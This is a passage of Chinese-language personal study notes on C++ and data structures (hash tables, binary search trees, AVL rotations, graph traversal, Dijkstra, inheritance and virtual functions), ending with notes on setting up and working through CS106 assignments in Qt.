id="哈希">哈希</h3><p>通过key找到value的位置</p><ul><li><p>选择一个函数将key转换为整数值（哈希码）</p></li><li><p>该策略（利用哈希函数进行映射）可抽象出哈希表</p></li><li><p>链表数组（数组每个元素是链表）：数组的每一个元素（链表）被称为<strong>bucket</strong></p></li><li><p>哈希码的取值范围通常远大于桶的数量，可以通过模运算（取余数）将哈希码缩小到桶的范围内</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bucket是桶编号，nBucket是桶的数量</span></span><br><span class="line"><span class="type">int</span> bucket = <span class="built_in">hashCode</span>(key) % nBuckets;</span><br></pre></td></tr></tbody></table></figure></li><li><p>将两个或更多不同的键哈希与同一存储桶的键称为<strong>碰撞</strong></p></li><li><p>负载因子α：计算公式为：<span class="math inline">\(\alpha =\frac{n}{m}\)</span></p><ul><li>n：当前哈希表中存储的元素数量。</li><li>m：哈希表中桶（槽）的数量。</li><li><strong>较低的负载因子</strong>：表示哈希表中有许多空桶，这通常意味着插入和查找操作的平均时间复杂度较低，因为发生碰撞的概率较小。</li><li><strong>较高的负载因子</strong>：表示哈希表中接近满的状态，可能会导致较多的碰撞，从而增加查找和插入操作的时间复杂度</li></ul></li><li><p><strong>HashMap</strong>：map的查找速度一般是O(n)，而hashMap查找速度是O(1)</p></li></ul><h2 id="chapter-16">Chapter 16</h2><p>树</p><h3 id="二叉搜索树bst">二叉搜索树（BST）</h3><ul><li>二叉搜索树的每个节点的权值都是唯一的</li><li>左子树 &lt; 根节点 &lt; 右子树</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">BSTNode</span> { </span><br><span class="line">   string key; </span><br><span class="line">   BSTNode *left, *right; </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="插入节点">插入节点</h4><ul><li><p>使用二分查找的思想</p></li><li><p>从根节点开始递归，小于根节点就进入左子树，否则进入右子树，直到找到插入位置</p><p>注意：插入值不能与二叉排序树中的值重复</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *注意这里使用的是对指针的引用，因为函数类型是void，无返回值，只在函数内修改值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertNode</span><span class="params">(BSTNode * &amp; t, <span class="type">const</span> string &amp; key)</span> </span>{   </span><br><span class="line">   <span class="keyword">if</span> (t == <span class="literal">NULL</span>) { </span><br><span class="line">      t = <span class="keyword">new</span> BSTNode; </span><br><span class="line">      t-&gt;key = key; </span><br><span class="line">      t-&gt;left = t-&gt;right = <span class="literal">NULL</span>; </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      <span class="keyword">if</span> (key != t-&gt;key) { </span><br><span class="line">         <span class="keyword">if</span> (key &lt; t-&gt;key) { </span><br><span class="line">            <span class="built_in">insertNode</span>(t-&gt;left, key); </span><br><span class="line">         } <span class="keyword">else</span> { </span><br><span class="line">            <span class="built_in">insertNode</span>(t-&gt;right, key); </span><br><span class="line">         } </span><br><span class="line">      } </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="删除节点">删除节点</h4><p>共有三种情况，假设要删除的节点为 z</p><ul><li>叶结点：直接删除</li><li>只有一棵子树：让子树成为 z 的父结点的子树</li><li>有左右两个子树：令<strong>右子树最左下结点/直接后继（或左子树最右下结点/直接前驱）</strong>代替z，然后删除直接后继/直接前驱结点</li></ul><p>注意：删除一个结点可能会影响多个结点，因此可能要操作多次</p><h4 id="遍历">遍历</h4><ul><li><strong>中序遍历</strong>（左根右）可以得到有序序列</li><li>先序遍历（根左右）</li><li>后序遍历（左右根）</li></ul><h3 id="平衡二叉树">平衡二叉树</h3><p>二叉搜索树的最坏情况是每个节点只有一个子树，此时查找操作的时间复杂度是O(n).</p><ul><li>平衡二叉树的左右子树高度相差不超过1</li><li>二叉搜索树在平衡时才能保证查找的时间复杂度为O(logn)</li></ul><h4 id="avl算法">AVL算法</h4><p>操作对象是最小不平衡子树</p><ol type="1"><li><strong>单旋转操作</strong><ul><li><strong>LL</strong>平衡旋转（右单旋转）：在左孩子的左子树插入结点，需要旋转<strong>左孩子结点</strong></li><li><strong>RR</strong>平衡旋转（左单旋转）：在右孩子的右子树插入结点，需要旋转<strong>右孩子结点</strong></li></ul></li><li><strong>双旋转操作</strong><ul><li><strong>LR</strong>平衡旋转（先左后右）：在左孩子的右子树插入结点，旋转<strong>左孩子</strong>的<strong>右子树的根结点</strong>（先左后右，操作的是同一个节点）</li><li><strong>RL</strong>平衡旋转（先右后左）：在右孩子的左子树插入结点，旋转<strong>右孩子</strong>的<strong>左子树的根结点</strong>（先右后左，操作的是同一个节点）</li></ul></li></ol><p><strong>代码实现</strong>：需要在节点结构中添加平衡因子（左右节点高度差）</p><h2 id="chapter-18">Chapter 18</h2><p>图</p><h3 id="图的结构">图的结构</h3><ul><li>vertex ：顶点</li><li>edge ：边，弧</li><li>有向图</li><li>无向图</li><li>路径：从一个节点到另一个节点经过的弧的集合</li><li>回路：在同一个节点开始和结束</li><li>简单路径：不出现重复的节点</li><li>度：相邻节点数</li><li>入度（进入该节点）、出度（离开该节点）：有向图</li><li>连通图（无向图）：任意两个节点是连通的</li><li>连通分量：极大连通子图</li><li>强连通图（有向图）：任意一对顶点 v、w ，从 v 到 w、从 w 到 v均有路径</li></ul><h3 id="图的表示形式">图的表示形式</h3><h4 id="邻接表">邻接表</h4><ul><li>对图的每个顶点建立一个单链表（<strong>边表</strong>），指向单链表的顶点组成顶点表（数组）</li><li>更适合处理稀疏图</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230815093150181.png"></p><h4 id="邻接矩阵">邻接矩阵</h4><ul><li>使用二维数组存放各个节点的度，或者用布尔值表示弧是否存在</li><li>空间复杂度O(n<sup>2</sup>)</li><li>更适合处理稠密图</li></ul><h3 id="图的遍历">图的遍历</h3><h4 id="深度优先搜索">深度优先搜索</h4><ul><li>利用循环遍历节点，在循环中调用递归</li><li>记录访问过的节点</li></ul><h4 id="广度优先搜索">广度优先搜索</h4><ul><li>每一轮访问与当前节点相邻的节点</li><li>使用队列存放当前要访问的节点</li><li>访问出队节点的相邻节点</li><li>队空则循环结束</li></ul><h3 id="最短路径">最短路径</h3><h4 id="dijkstra-算法">Dijkstra 算法</h4><ul><li>使用优先队列存放源点到各点的路径长度</li><li>利用一个集合 S 存放已被访问过的顶点</li><li>步骤：<ol type="1"><li>优先队列初始化为空</li><li>先将源点添加到 S 中</li><li>然后访问与源点相邻的顶点，并将对应的路径存入优先队列中（从小到大排列）</li><li>弹出优先队列队顶元素（最小），访问该点的相邻顶点并加入优先队列</li><li>重复上述步骤直到目标顶点</li></ol></li></ul><h2 id="chapter-19">Chapter 19</h2><p>继承</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">subclass</span> : <span class="keyword">public</span> superclass {</span><br><span class="line">    <span class="comment">// new entries for subclass</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p><code>subclass</code>继承了<code>superclass</code>的所有公共成员，但不能直接访问<code>superclass</code>的私有成员</p><p>派生类对象同时也是基类对象</p><h3 id="公有派生">公有派生</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> {</span><br><span class="line">......  </span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> : <span class="keyword">public</span> Parent {</span><br><span class="line">......</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><ul><li><p>基类的公有成员将成为派生类的公有成员，派生类只能通过基类的<strong>公有方法</strong>或<strong>保护方法</strong>访问基类的私有成员</p></li><li><p>构造函数：派生类不能直接访问基类的私有成员，因此派生类的构造函数需要<strong>调用基类构造函数</strong></p><blockquote><p>子类的构造函数在执行时<strong>一定会</strong>调用父类的构造函数。这是因为子类的对象不仅包含子类自身的数据成员，还包含从父类继承的那些数据成员。</p></blockquote><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateVar;  <span class="comment">// 私有成员，派生类无法直接访问</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 基类的构造函数，用于初始化私有成员</span></span><br><span class="line">    <span class="built_in">Base</span>(<span class="type">int</span> x) : <span class="built_in">privateVar</span>(x) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base constructor called, privateVar = "</span> &lt;&lt; privateVar &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 派生类的构造函数，通过调用基类的构造函数初始化基类的私有成员</span></span><br><span class="line">    <span class="built_in">Derived</span>(<span class="type">int</span> x) : <span class="built_in">Base</span>(x) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Derived constructor called."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="function">Derived <span class="title">d</span><span class="params">(<span class="number">10</span>)</span></span>;  <span class="comment">// 创建派生类对象，间接初始化基类的私有成员</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>访问控制：<strong>protected</strong></p><ul><li>对于外部世界来说，保护成员和私有成员类似，都不能被直接访问</li><li><strong>在派生类中</strong>，可以<strong>直接访问</strong>基类的<code>protected</code> 和 <code>public</code>成员。这意味着在派生类的成员函数中，可以直接使用 <code>protected</code>和 <code>public</code> 成员变量或成员函数。</li><li><strong>在派生类的对象上</strong>，派生类的 <code>public</code>成员可以在外部直接访问，而 <code>protected</code>成员只能在派生类或其子类的成员函数中访问，<strong>不能通过对象在外部访问</strong>。</li></ul></blockquote></li></ul><h3 id="虚函数">虚函数</h3><p>实现多态</p><ul><li><p>虚函数：子类中的函数覆盖父类函数。（在对应函数前添加<code>virtual</code>）</p><p>函数在基类中被声明为虚的后，它在派生类中将自动成为虚函数，不过在派生类中也使用virtual能更直观</p><blockquote><p><strong>覆盖</strong>：子类提供了一个与父类虚函数具有相同函数签名（函数名、参数类型、参数个数）的实现，称为覆盖。这个新函数将替代父类中的虚函数实现，当通过基类指针或引用调用该函数时，实际执行的是子类的实现（<strong>动态绑定</strong>）</p></blockquote></li><li><p>纯虚函数：对应函数在基类中未被实现（除了添加<code>virtual</code>还需要在函数结尾添加<code>= 0</code>，如下）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>如果类中至少有一个函数被声明为纯虚函数，则这个类就是<strong>抽象类</strong>，抽象类<strong>不能被用于实例化对象</strong>，它只能作为<strong>接口</strong>使用。</p></blockquote></li></ul><p>注意：构造函数不能是虚函数；友元函数不能是虚函数，因为友元函数不属于类成员</p><h3 id="虚析构函数">虚析构函数</h3><ul><li><p>如果析构函数不是虚的，则将只调用对应于指针类型的析构函数，这意味着即使指针指向的是一个派生类对象，只有基类的析构函数被调用，则会导致派生类中的资源和成员变量不会被正确释放或清理。</p></li><li><p>如果析构函数是虚的，将<strong>调用相应对象类型的析构函数</strong>。因此，如果指针指向的是派生类对象，那么将<strong>先调用派生类的析构函数，然后自动调用基类的析构函数</strong>。因此，使用虚析构函数可以确保正确的析构函数序列被调用。</p></li></ul><h3 id="指向对象的指针">指向对象的指针</h3><ul><li><p>子类与父类在内存中所占空间大小可能不同，因此不能直接将子类对象赋值给父类对象。</p></li><li><p>使用基类指针指向子类对象是为了实现<strong>多态</strong>（polymorphism）和<strong>动态绑定</strong>（dynamicbinding）</p></li><li><p>当基类指针指向子类对象时，该指针的<strong>静态类型</strong>（compile-timetype）是基类类型，而指针实际指向对象的<strong>动态类型</strong>（run-timetype）是子类类型。示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Parent's show function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nonVirtualFunc</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Parent's non-virtual function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> : <span class="keyword">public</span> Parent {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">override</span> </span>{  <span class="comment">// 或者写成 `virtual void show()`</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Child's show function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nonVirtualFunc</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Child's non-virtual function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Parent* ptr = <span class="keyword">new</span> <span class="built_in">Child</span>();</span><br><span class="line"></span><br><span class="line">    ptr-&gt;<span class="built_in">show</span>();           <span class="comment">// 动态绑定，调用子类的虚函数</span></span><br><span class="line">    ptr-&gt;<span class="built_in">nonVirtualFunc</span>();  <span class="comment">// 静态绑定，调用基类的非虚函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> ptr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>当程序执行到一个函数调用时，系统需要决定调用哪个具体的函数，这个过程就叫做<strong>联编</strong>。联编可以在<strong>编译时</strong>或<strong>运行时</strong>进行，这分别被称为<strong>静态联编</strong>和<strong>动态联编</strong>。</p><blockquote><p>静态联编：在编译过程中进行联编</p><p>动态联编：在程序运行时选择正确的虚函数</p></blockquote></li></ul><h2 id="额外知识">额外知识</h2><h3 id="内联函数">内联函数</h3><p>程序运行时不需要在内存中跳到对应函数的位置执行代码，在编译时，编译器会把该函数的代码副本放置在每个调用该函数的地方。（空间换时间）</p><ul><li>在函数声明或函数定义前添加<code>inline</code>关键字</li><li>在类内定义的函数，它具有隐式的 <code>inline</code> 说明符</li><li>添加<code>inline</code>关键字的函数不一定能被编译器判定为内联函数：<ul><li>函数过大</li><li>函数递归</li></ul></li></ul><h3 id="虚表">虚表</h3><p>通常，编译器处理虚函数的方法是：<strong>给每个对象添加一个隐藏成员</strong>。隐藏成员中保存了一个指向函数地址数组的<strong>指针</strong>。这种数组称为<strong>虚函数表</strong>(virtualfunctiontable,vtbl)。虚函数表中存储了为类对象进行声明的<strong>虚函数地址</strong>。</p><p>例如，基类对象包含一个指针，该指针指向基类中包含 所有虚函数地址 的表。同样的，派生类对象也将包含一个指向独立地址表的指针。</p><ul><li>如果派生类提供了<strong>虚函数的新定义</strong>，该虚函数表将保存新函数的地址；如果派生类没有重新定义虚函数，该vtbl将保存函数原始版本的地址。</li><li>如果派生类定义了<strong>新的虛函数</strong>（与基类的虚函数无关），则该函数的地址也将被添加到vtbl中。</li></ul><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20241020224758096.png" alt="image-20241020224758096"><figcaption aria-hidden="true">image-20241020224758096</figcaption></figure><h3 id="虚基类">虚基类</h3><p><strong>虚基类</strong>（Virtual BaseClass）是C++中的一种机制，主要用于解决<strong>多重继承</strong>中<strong>菱形继承问题</strong>（diamondproblem）。菱形继承问题会导致基类的成员在派生类中出现<strong>重复拷贝</strong>，从而产生潜在的二义性问题（派生类对象可能包含多个相同的基类部分成员）。虚基类通过确保在菱形继承结构中，派生类只继承第一个基类，从而避免了这个问题。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">A</span>() : <span class="built_in">value</span>(<span class="number">0</span>) {}</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> <span class="keyword">virtual</span> A {};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> <span class="keyword">virtual</span> A {};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> B, <span class="keyword">public</span> C {};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    D d;</span><br><span class="line">    d.value = <span class="number">10</span>;  <span class="comment">// 现在 D 中只有一个 A 的成员变量</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"D::value: "</span> &lt;&lt; d.value &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>或者（不使用虚基类）在代码中显式表明作用域来表示子类使用的是哪一个父类的成员：<code>d.B::value</code></p><h3 id="函数隐藏name-hiding">函数隐藏（<strong>namehiding</strong>）</h3><p>是指基类中的成员函数被派生类中<strong>同名</strong>但<strong>不同签名</strong>（参数不同或返回不同）的成员函数覆盖，从而导致基类的函数无法在派生类对象中被直接访问。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base class show(int): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">double</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base class show(double): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Derived class show(int): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Derived d;</span><br><span class="line">    d.<span class="built_in">show</span>(<span class="number">10</span>);        <span class="comment">// 调用 Derived 的 show(int)</span></span><br><span class="line">    <span class="comment">// d.show(3.14);   // 错误：Derived 中没有 show(double)</span></span><br><span class="line">    d.Base::<span class="built_in">show</span>(<span class="number">3.14</span>); <span class="comment">// 需要明确指定调用基类的 show(double)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li>在派生类 <code>Derived</code> 中，定义了 <code>show(int)</code>函数，它<strong>隐藏了</strong>基类 <code>Base</code> 中所有同名的<code>show()</code> 函数（即 <code>show(int)</code> 和<code>show(double)</code>）。</li><li>因此，当调用 <code>d.show(3.14)</code>时，会报错，因为编译器只能看到 <code>Derived</code> 中的<code>show(int)</code> 函数，而 <code>Base</code> 中的<code>show(double)</code> 函数被隐藏。</li><li>如果你仍想调用基类的 <code>show(double)</code> 函数，可以使用<code>d.Base::show(3.14)</code> 来明确指明调用基类的函数。</li></ul><h2 id="assignment-0">Assignment 0</h2><h3 id="配置环境">配置环境</h3><p>安装好Qt后，打开 NameHash.pro 文件，构建报错，报错信息如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Cannot find version <span class="number">2021.1</span> of CS106 library. Install CS106 package following instructions at https:<span class="comment">//web.stanford.edu/dept/cs_edu/qt.  Stop.</span></span><br></pre></td></tr></tbody></table></figure><p>于是打开 NameHash.pro文件查看代码，添加下面代码方便构建时查看对应库的位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message(USER_DATA_DIR = $$USER_DATA_DIR)</span><br><span class="line">message(SPL_DIR = $$SPL_DIR)</span><br><span class="line">message(STATIC_LIB = $$STATIC_LIB)</span><br><span class="line">message(SPL_VERSION_FILE = $$SPL_VERSION_FILE)</span><br></pre></td></tr></tbody></table></figure><p>运行得到：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Project MESSAGE: USER_DATA_DIR = C:/Users/hxt/AppData/Local</span><br><span class="line">Project MESSAGE: SPL_DIR = C:/Users/hxt/AppData/Local/cs106</span><br><span class="line">Project MESSAGE: STATIC_LIB = C:\Users\hxt\AppData\Local\cs106\lib\libcs106.a</span><br><span class="line">Project MESSAGE: SPL_VERSION_FILE = C:\Users\hxt\AppData\Local\cs106\lib\version2023.1</span><br></pre></td></tr></tbody></table></figure><p>找到<code>lib</code>文件夹，打开发现版本是<code>2023.1</code>，于是尝试修改NameHash.pro 文件中的版本信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPL_VERSION = 2021.1  ----&gt;  SPL_VERSION = 2023.1</span><br></pre></td></tr></tbody></table></figure><p>再次构建，成功！</p><h2 id="assignment-1">Assignment 1</h2><h3 id="结构体-1">结构体</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PenStyle</span> {</span><br><span class="line">    <span class="type">double</span> width;</span><br><span class="line">    std::string color;</span><br><span class="line">};</span><br><span class="line">PenStyle style = = { <span class="number">1</span>, <span class="string">"black"</span> };  <span class="comment">// C++中结构体的名字可以直接用作类型名称，前面不需要再加struct了</span></span><br></pre></td></tr></tbody></table></figure><h3 id="warning">Warning</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(3x3 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(3x3 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(12x12 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: QObject::killTimer: Timers cannot be stopped from another thread</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 20204</span><br><span class="line"></span><br><span class="line">Qt internal warning: QObject::~QObject: Timers cannot be stopped from another thread</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 20204</span><br></pre></td></tr></tbody></table></figure><p>Qt运行Plot时报错，不知道怎么解决</p><h2 id="assignment-2">Assignment 2</h2><h3 id="part-one">Part One</h3><h4 id="milestone-one">Milestone One</h4><ul><li>将文本中出现的字符串分为不同子字符串（三元组，可能用UTF-8表示），并统计其出现次数</li></ul><h4 id="milestone-two">Milestone Two</h4><ul><li><p>归一化：假设每个子字符串出现次数的平方和为s，然后将每个子字符串出现的次数除以<span class="math inline">\(\sqrt{s}\)</span>，得到对应的频率，例如下面的示例：</p><blockquote><p>"aaa": 3 "baa": 1 "aab": 1</p><p>计算平方和：3<sup>2</sup> + 1<sup>2</sup> + 1<sup>2</sup> = 11</p><p>计算频率：3/<span class="math inline">\(\sqrt{11}\)</span> =0.904534，1/<span class="math inline">\(\sqrt{11}\)</span> =0.301511</p></blockquote></li><li><p>难点在于如何遍历map，这里我使用的是 range-based for</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span 